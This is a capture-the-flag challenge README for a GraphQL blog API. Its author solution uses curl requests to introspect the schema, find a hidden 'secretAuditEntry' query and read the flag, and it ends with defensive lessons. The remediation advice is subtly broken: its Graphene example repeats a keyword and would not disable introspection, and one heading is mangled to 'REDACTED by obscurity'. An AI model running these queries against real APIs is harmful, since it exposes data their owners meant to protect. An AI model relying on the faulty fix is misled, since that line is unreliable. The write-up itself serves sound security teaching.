# GraphQL Introspection — BlogQL

A Flask + Graphene API that exposes a public `posts` query and an
"internal" `secretAuditEntry` query that returns the flag. The
frontend pretends `secretAuditEntry` doesn't exist; introspection
is on, so the schema spills it anyway.

## Player target

Read the flag via the GraphQL endpoint.

## Author solution

1. Introspect the query type:

   ```bash
   curl -s http://target:5000/graphql \
     -H 'content-type: application/json' \
     -d '{"query":"{ __schema { queryType { fields { name description type { name } } } } }"}'
   ```

   Reveals:
   ```
   posts             (Post list)             — Public list of blog posts.
   secretAuditEntry  (String)                — Internal — do not call from external clients...
   ```

2. Call it:

   ```bash
   curl -s http://target:5000/graphql \
     -H 'content-type: application/json' \
     -d '{"query":"{ secretAuditEntry }"}'
   # {"data":{"secretAuditEntry":"CTF{REDACTED}"}}
   ```

## Why this is the lesson

* **REDACTED by obscurity is not security.** If a field exists in
  the schema and is reachable over the network, it must enforce
  authorisation in its resolver — not rely on "no one knows it's
  there".
* **Disable introspection in production.** Graphene supports a
  custom `Schema(types=..., types=...)` configuration; alternatives
  like Ariadne let you remove `__schema`/`__type` entirely.
* **Use a depth + rate limit.** Even with introspection off,
  GraphQL is a request-amplification vector — nested queries can
  trigger N+1 storms.
